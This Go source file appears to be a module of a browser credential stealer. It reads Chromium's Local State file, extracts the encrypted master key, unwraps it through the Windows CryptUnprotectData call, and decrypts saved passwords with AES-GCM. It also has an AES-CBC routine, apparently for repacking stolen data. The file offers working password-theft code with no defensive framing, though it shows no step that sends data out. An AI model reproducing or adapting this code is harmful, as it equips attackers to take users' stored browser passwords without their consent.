package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"io"
	"io/ioutil"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

const (
	salt        = "CHUJ"
	keySize     = 32
	iteration   = 65536
	ivSize      = aes.BlockSize
	paddingSize = 16
)

func EncryptData(data []byte, master string) ([]byte, error) {
	block, err := aes.NewCipher([]byte(master))
	if err != nil {
		return nil, err
	}

	// Generate a random initialization vector (IV)
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// Pad the data to the block size
	paddedData := addPadding(data, aes.BlockSize)

	// Encrypt the data
	mode := cipher.NewCBCEncrypter(block, iv)
	encryptedData := make([]byte, len(paddedData))
	mode.CryptBlocks(encryptedData, paddedData)

	// Append the IV to the encrypted data
	encryptedData = append(iv, encryptedData...)

	return encryptedData, nil
}

// addPadding adds PKCS#7 padding to the data.
func addPadding(data []byte, blockSize int) []byte {
	padding := blockSize - (len(data) % blockSize)
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

func DecryptPassword(buff, masterKey []byte) string {
	iv := buff[3:15]
	payload := buff[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "Error while creating cipher block: " + err.Error()
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "Error while creating GCM block: " + err.Error()
	}

	decrypted, err := aesgcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "Error while decrypting password: " + err.Error()
	}

	return string(decrypted)
}

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func GetMasterKey(localStatePath string) ([]byte, error) {
	var masterKey []byte

	jsonFile, err := os.Open(localStatePath)
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}

	_ = json.Unmarshal(byteValue, &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI")

	masterKey, err = Decrypt([]byte(stringKey))
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil
}
